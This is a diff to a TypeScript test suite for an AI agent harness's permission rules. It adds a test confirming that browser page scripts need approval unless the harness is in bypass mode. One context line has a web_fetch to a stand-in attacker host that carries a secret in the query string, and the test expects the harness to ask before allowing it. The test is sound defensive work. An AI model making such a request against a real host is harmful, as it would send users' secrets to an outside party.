@@ -160,6 +160,17 @@ describe('allow rules', () => {
     expect(decide('web_fetch', { url: 'https://attacker.example.net/?q=secret' }, 'auto', { rules })).toBe('ask');
   });
 
+  it('asks before every page script, even in auto mode or under an allow rule', async () => {
+    await setComputerEnabled(scope.stateDir, true);
+    const judge = (mode: AiHarnessPermissionMode, rules = NO_RULES) => decidePermission({
+      tool: computerWebTool, args: { action: 'evaluate', expression: 'document.title' }, mode, rules, planMode: false, scope, hasApprover: true,
+    }).decision;
+    expect(judge('auto')).toBe('ask');
+    expect(judge('auto', parsePermissionRules(['browser_use']))).toBe('ask');
+    expect(judge('ask', parsePermissionRules(['computer_web']))).toBe('ask');
+    expect(judge('bypass')).toBe('allow');
+  });
+
   it('does not let an MCP server\'s readOnlyHint skip approval in ask mode', () => {
     const lookup = mcpToolDefinition('web', { name: 'lookup', annotations: { readOnlyHint: true } }, 'mcp__web__lookup', async () => ({ content: [] }));
     const judge = (mode: AiHarnessPermissionMode, rules: PermissionRules = NO_RULES) =>
